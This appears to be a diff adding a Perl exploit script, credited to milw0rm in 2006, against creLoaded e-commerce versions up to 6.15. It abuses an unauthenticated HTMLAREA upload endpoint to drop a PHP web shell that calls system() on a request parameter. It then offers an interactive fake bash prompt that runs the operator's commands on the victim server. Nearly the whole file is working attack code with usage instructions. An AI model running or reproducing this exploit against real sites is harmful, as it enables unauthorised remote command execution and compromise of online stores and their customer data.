@@ -1,0 +1,124 @@
+#!/usr/bin/perl
+#
+# creLoaded <= 6.15 HTMLAREA automated perl exploit
+# hacked up by kaneda <kaneda@blacksecurity.org>
+#
+# Rather simple exploit, but still an exploit nonetheless.  Attempts to upload php script and 
+# utilise that to execute commands, and show off a fake shell.
+#
+# Can specify:
+# 	* User-defined PHP script or one provided in this script (suits most occasions)
+# 	* Additional variables to pass to PHP script after upload
+# 	* HTTP proxy
+#
+# Read the (messy) code before use.
+#
+# Greets: nemo, mercy, riotact, zeroday, modem, phildo, gimmemylanta, rodjek, negz
+#
+
+print "creLoaded <= 6.15 HTMLAREA automated perl exploit\nhacked up by kaneda\n";
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+use Getopt::Std;
+use Term::ReadLine;
+
+my $baseurl = "/admin/htmlarea/popups/file/files.php";
+
+my $status = getopts('s:p:a:');
+if(@ARGV < 1) { die(usage()); }
+
+my %vars, $response, $masterurl, $browser, $cmd;
+$masterurl = @ARGV[0];
+$browser = LWP::UserAgent->new;
+
+if($opt_s) {
+	print "[*] User-defined script '$opt_s' will be used instead of 'default'\n";
+}
+
+if($opt_p) {
+	$browser->proxy(['http', 'https'] => $opt_p);
+	print "[*] HTTP/HTTPS proxy set to $opt_p\n";
+}
+
+if($opt_a) {
+	@tmp = split(",",$opt_a);
+	foreach $tmpvar (@tmp) {
+		@tmp2 = split("=",$tmpvar);
+		$vars{$tmp2[0]} = $tmp2[1];
+		print "[+] Adding variable '" . $tmp2[0] . "' with value '" . $tmp2[1] . "'\n";
+	}
+}
+
+sub usage 
+{
+	print "usage: creloaded615.pl [-s/path/to/file.php] [-phostname:port] [-avarname1=value1,...,varname2=value2] URL\n\n";
+	print "-a - additional variables i.e. -aaction=create,cid=12\n";
+	print "-p - use http/https proxy, format hostname:port i.e. -pmyproxy.com:8080\n";
+	print "-s - specify path to user-defined script instead of using default\n";
+	print "URL - http://vuln/store\n\n";
+	exit;
+}
+
+sub sendform 
+{
+	if($opt_G) {
+		my $url = $masterurl . "?";
+		# Non-issue, but could beautify the single line here at a later date.
+		foreach $tmp (keys (%vars)) {
+			$url .= "\&$tmp=" . $vars{$tmp};
+		}
+		$response = $browser->get($url);
+		die "Failed to get!" unless defined $response;
+	} else {
+		$response = $browser->post($masterurl, \%vars);
+		die "Failed to post!" unless defined $response;
+	}
+}
+
+if(!$opt_s) {
+	# Lazy.
+	print "[*] Creating 'default' PHP script\n";
+	$tmp = "<?php system(\$a); ?>";
+	open(FILE, "> /tmp/default.php");
+	print FILE $tmp;
+	close(FILE);
+	$opt_s = "/tmp/default.php";
+}
+
+open(FILE, "< $opt_s");
+@content = <FILE>;
+close(FILE);
+
+if(!$vars{"dirPath"}) {
+	print "[*] Setting upload path to $masterurl/images\n";
+	$vars{"dirPath"} = "/../images/";
+}
+$tmp = $masterurl . $baseurl;
+print "[*] Abusing creLOADED\n";
+$browser->timeout(10);
+$req = POST $tmp, Content_Type => 'form-data', Content => [ actions => "upload", dirPath => $vars{"dirPath"}, upload => [ $opt_s ] ];
+$response = $browser->request($req);
+$browser->timeout(180);
+$term = Term::ReadLine->new('cre');
+
+print "[*] Executing 'id' then spawning fake shell\n";
+$masterurl = $masterurl . "/images/default.php";
+$vars{"a"} = "id";
+&sendform;
+print $response->content;
+while(1) {
+	$prompt = "bash-2.05b\$ ";
+	$tmp = $term->readline($prompt, "");
+	$cmd = $tmp;
+	
+	if(($cmd eq "quit") || ($cmd eq "exit")) {
+		exit;
+	}
+
+	$vars{"a"} = $cmd;
+	&sendform;
+	print $response->content;
+}
+
+# milw0rm.com [2006-01-24]
